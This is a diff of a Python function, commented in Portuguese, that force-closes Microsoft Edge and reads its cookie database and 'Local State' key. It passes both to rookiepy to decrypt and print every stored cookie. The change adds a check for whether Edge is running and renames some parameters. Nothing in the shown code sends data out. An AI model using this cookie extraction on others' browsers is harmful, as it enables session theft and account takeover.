@@ -5,16 +5,18 @@ from datetime import datetime
 
 def getCookies():
     try:
-        os.system("taskkill /F /IM msedge.exe")
-        os.system('cls' if os.name == 'nt' else 'clear')
+        # Verifica se o navegador Edge está aberto e fecha, se necessário
+        if os.system("tasklist | findstr msedge.exe") == 0:
+            os.system("taskkill /F /IM msedge.exe")
+            os.system('cls' if os.name == 'nt' else 'clear')
 
         # Caminhos para os arquivos do Edge
-        localAppData = os.getenv('LOCALAPPDATA')
-        dbPath = Path(localAppData) / 'Microsoft/Edge/User Data/Default/Network/Cookies'
-        keyPath = Path(localAppData) / 'Microsoft/Edge/User Data/Local State'
+        localappdata = os.getenv('LOCALAPPDATA')
+        dbPath = Path(localappdata) / 'Microsoft/Edge/User Data/Default/Network/Cookies'
+        keyPath = Path(localappdata) / 'Microsoft/Edge/User Data/Local State'
 
         # Usa rookiepy para extrair os cookies
-        cookies = rookiepy.any_browser(dbPath=str(dbPath), keyPath=str(keyPath), domains=None)
+        cookies = rookiepy.any_browser(db_path=str(dbPath), key_path=str(keyPath), domains=None)
 
         # Depuração: Exibir os cookies obtidos
         if cookies:
